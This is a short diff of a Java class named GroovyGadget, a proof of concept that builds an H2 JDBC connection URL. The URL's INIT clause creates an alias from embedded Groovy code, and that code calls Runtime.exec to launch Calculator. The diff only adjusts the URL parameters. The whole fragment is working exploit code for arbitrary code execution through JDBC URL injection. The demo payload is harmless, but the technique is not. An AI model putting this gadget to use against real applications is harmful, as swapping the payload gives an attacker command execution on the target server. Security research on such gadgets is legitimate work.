@@ -12,7 +12,7 @@ public class GroovyGadget {
                         + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")"
                         + "})"
                         + "def x";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
+        String url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Connection conn = DriverManager.getConnection(url);
         conn.close();
